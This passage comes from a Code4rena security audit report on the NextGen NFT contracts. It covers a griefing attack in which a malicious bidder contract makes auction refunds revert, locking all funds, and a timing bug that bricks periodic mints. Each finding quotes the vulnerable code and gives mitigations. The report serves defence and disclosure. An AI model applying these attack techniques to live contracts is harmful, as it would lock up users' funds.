href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1029\">Arabadzhiev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/992\">PENGUN</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/969\">niki</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/899\">nmirchev8</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/715\">flacko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/653\">Soul22</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/601\">ZdravkoHr</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/536\">0xpiken</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/507\">funkornaut</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/466\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/440\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/361\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/293\">openwide</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/85\">oualidpro</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/64\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1381\">Haipls</a></em></p>\n<p><code>claimAuction()</code> implements a push-strategy instead of a pull-strategy for returning the bidders funds.</p>\n<p>This gives the opportunity for an adversary to DOS the function, locking all funds from other participants.</p>\n<p>This finding differs from the automated findings report <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#m-01-unchecked-return-value-of-low-level-calldelegatecall\">M-01</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-18-gas-griefingtheft-is-possible-on-an-unsafe-external-call\">L-18</a>, as it has a different root cause, canâ€™t be prevented with any of the mitigations from the bot, and also highlights the actual High impact of the issue.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<ul>\n<li>Prevents other bidders from receiving their bids back.</li>\n<li>Prevents the token owner from receiving earnings.</li>\n<li>Prevents the bidder winner from receiving the NFT.</li>\n</ul>\n<p>All Ether from the auction can be lost as there is no alternate way of recovering it.</p>\n<p>This also breaks one of the <a href=\"https://github.com/code-423n4/2023-10-nextgen#main-invariants\">main invariants of the protocol</a>:</p>\n<blockquote>\n<p>Properties that should NEVER be broken under any circumstance:</p>\n<ul>\n<li><strong>The highest bidder will receive the token after an auction finishes</strong>, <strong>the owner of the token will receive the funds</strong> and <strong>all other participants will get refunded</strong>.</li>\n</ul>\n</blockquote>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>An adversary can create bids for as little as 1 wei, as there is no minimum limitation: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L58\">AuctionDemo.sol#L58</a>. With that, it can participate in as many auctions as they want to grief all auctions.</p>\n<p>All non-winning bidders that didnâ€™t cancel their bid before the auction ended will receive their bids back during <code>claimAuction()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WinnerOrAdminRequired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">,this.claimAuction.selector){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;      </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ownerOfToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;              (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Refund</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116\">AuctionDemo.sol#L116</a></p>\n<p>The contracts call the bidders with some <code>value</code>. If the receiver is a contract, it can execute arbitrary code. A malicious bidder can exploit this to make the <code>claimAuction()</code> always revert, and so no funds to other participants be paid back.</p>\n<p>With the current implementation, a gas bomb can be implemented to perform the attack. <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-18-gas-griefingtheft-is-possible-on-an-unsafe-external-call\">L-18</a>\nfrom the automated findings report suggests the use of <code>excessivelySafeCall()</code> to prevent it, but it limits the functionality of legit contract receivers, and eventually preventing them from receiving the funds. In addition, the finding doesnâ€™t showcase the High severity of the issue and may be neglected.</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#m-01-unchecked-return-value-of-low-level-calldelegatecall\">M-01</a> from the automated findings report points out the lack of a check of the <code>success</code> of the calls. If the function reverts when the call was not successful, the adversary can make a callback on its contract <code>receive()</code> function to always revert to perform this same attack. In addition, this finding also doesnâ€™t showcase the High severity of the issue.</p>\n<p>Ultimately the way to prevent this attack is to separate the transfer of each individual bidder to a separate function.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Create a separate function for each bidder to claim their funds back (such as the cancel bids functions are implemented).</p>\n<h3 id=\"assessed-type-2\" style=\"position:relative;\"><a href=\"#assessed-type-2\" aria-label=\"assessed type 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>ETH-Transfer</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1703#issuecomment-1825374235\">a2rocket (NextGen) acknowledged and commented via duplicate issue #1703</a>:</strong></p>\n<blockquote>\n<p>There are several ways to do this; we will introduce an additional <code>claimingFunction</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/734#issuecomment-1839381558\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden specifies a way in which an auction can be sabotaged entirely in its claim operation by gas griefing.</p>\n<p>While the finding has been identified as <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-18-gas-griefingtheft-is-possible-on-an-unsafe-external-call\">L-18</a> in the automated findings report, it may indeed be neglected and inadequately encompasses the severity of this flaw. </p>\n<p>As the Warden clearly illustrates, all funds in the auction will be permanently lost and in an easily accessible fashion by simply either consuming all gas in meaningless operations or gas-bombing via an arbitrarily large payload being returned.</p>\n<p>This particular submission was selected as best-for-report due to its acknowledgment of automated findings issues, precisely &#x26; correctly specifying the impact of the exhibit, and providing a PoC that demonstrates the problem.</p>\n<p>The C4 Supreme Court verdict <a href=\"https://docs.google.com/document/d/1Y2wJVt0d2URv8Pptmo7JqNd0DuPk_qF9EPJAj3iSQiE/edit#heading=h.vljs3xbfn8cj\">did not finalize on issues based entirely on automated findings</a> and as such, I will deem this exhibit a valid high submission given its accessibility and 2-tier upgrade from the automated findings report (<code>L</code> to <code>H</code>).</p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-multiple-mints-can-brick-any-form-of-salesoption-3-mintings\" style=\"position:relative;\"><a href=\"#h-04-multiple-mints-can-brick-any-form-of-salesoption-3-mintings\" aria-label=\"h 04 multiple mints can brick any form of salesoption 3 mintings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/380\">[H-04] Multiple mints can brick any form of <code>salesOption</code> 3 mintings</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/380\">0x3b</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2012\">AvantGard</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1123\">MrPotatoMagic</a>, Krace (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/632\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/631\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/89\">ZdravkoHr</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1981\">0xlemon</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1821\">fibonacci</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1553\">nuthan2x</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1474\">trachev</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/939\">oakcobalt</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/881\">Noro</a></em></p>\n<p>As explained by the sponsor, some collections might want to conduct multiple mints on different days. However, due to the way <code>salesOption</code> 3 works, these multiple mints might encounter issues.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>A collection has completed its first mint, where it minted 500 NFTs. However, the collection consists of 1000 NFTs, so the owner plans to schedule another mint, this time using sales option 3.</p>\n<table>\n<thead>\n<tr>\n<th>Values</th>\n<th>Time</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>allowlistStartTime</code></td>\n<td>4 PM</td>\n</tr>\n<tr>\n<td><code>allowlistEndTime</code></td>\n<td>7 PM</td>\n</tr>\n<tr>\n<td><code>publicStartTime</code></td>\n<td>7 PM</td>\n</tr>\n<tr>\n<td><code>publicEndTime</code></td>\n<td>1 day after public start</td>\n</tr>\n<tr>\n<td><code>timePeriod</code></td>\n<td>1 min</td>\n</tr>\n</tbody>\n</table>\n<p>The first userâ€™s mint will proceed smoothly since <code>timeOfLastMint</code> falls within the previous mint period. However, the second userâ€™s mint will fail. The same applies to all other whitelisted users. This issue arises due to the <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L252\">following block</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lastMintDate</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                + (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">) - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>This <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L252\">calculation</a> extends the allowed time significantly, granting the second minter an allowed time of <code>allowlistStartTime + 1 min * (500-1) = allowlistStartTime + 499 min</code>, which is equivalent to 8 hours and 19 minutes after <code>allowlistStartTime</code>. This enables the second user to mint at <strong>12:19 AM</strong>, long after the whitelist has ended and in the middle of the public sale. And if anyone tries to mint, this call will revert with <code>underflow</code> error, as <code>timeOfLastMint</code> > <code>block.timestamp</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">timeOfLastMint</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Itâ€™s worth noting that some collections may disrupt the whitelist, while others could brick the entire mint process; especially if there are more minted NFTs or a longer minting period.</p>\n<h3 id=\"poc\" style=\"position:relative;\"><a href=\"#poc\" aria-label=\"poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<ol>\n<li>Gits - <a href=\"https://gist.github.com/0x3b33/677f86f30603dfa213541cf764bbc0e8\">https://gist.github.com/0x3b33/677f86f30603dfa213541cf764bbc0e8</a>.</li>\n<li>Add to remappings - <code>contracts/=smart-contracts/</code>.</li>\n<li>Run it with <code>forge test --match-test test_multipleMints --lib-paths ../smart-contracts</code>.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>For this fix, I am unable to give any suggestion as big parts of the protocol need to be redone. I can only point out the root cause of the problem, which is <code>(gencore.viewCirSupply(col) - 1)</code> in the <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L252\">snippet below</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lastMintDate</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">viewCirSupply</span><span class=\"mtk1\">(</span><span class=\"mtk12\">col</span><span class=\"mtk1\">) - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<h3 id=\"assessed-type-3\" style=\"position:relative;\"><a href=\"#assessed-type-3\" aria-label=\"assessed type 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Error</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/380#issuecomment-1824060567\">a2rocket (NextGen) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/380#issuecomment-1845252426\">0xsomeone (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>The Wardenâ€™s submission was selected as the best given that it illustrates the problem by citing the relevant documentation of the project, contains a valid PoC, and acknowledges the difficulty in rectifying this issue. While the submission has under-estimated the issueâ€™s severity, the relevant high-severity issues (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2012\">#2012</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1123\">#1123</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/939\">#939</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/632\">#632</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/631\">#631</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/89\">#89</a>) were not of sufficient quality and the best candidate (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1123\">#1123</a>) minimizes the issueâ€™s applicability and does not advise a proper recommendation either.</p>\n<p>To alleviate the issue, the Sponsor is advised to implement a â€œstart dateâ€ for the periodic sales that is reconfigured whenever a periodic sale is re-instated. This would permit the <code>lastMintDate</code> calculations to â€œrestartâ€ the date from which periodic sale allowances should be tracked and also allow the code to snapshot the circulating supply at the time the first periodic sale occurs <strong>of each independent periodic sale phase</strong>. As the Warden correctly assessed, a viable solution to this vulnerability is difficult to implement.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-permanent-dos-due-to-non-shrinking-array-usage-in-an-unbounded-loop\" style=\"position:relative;\"><a href=\"#h-05-permanent-dos-due-to-non-shrinking-array-usage-in-an-unbounded-loop\" aria-label=\"h 05 permanent dos due to non shrinking array usage in an unbounded 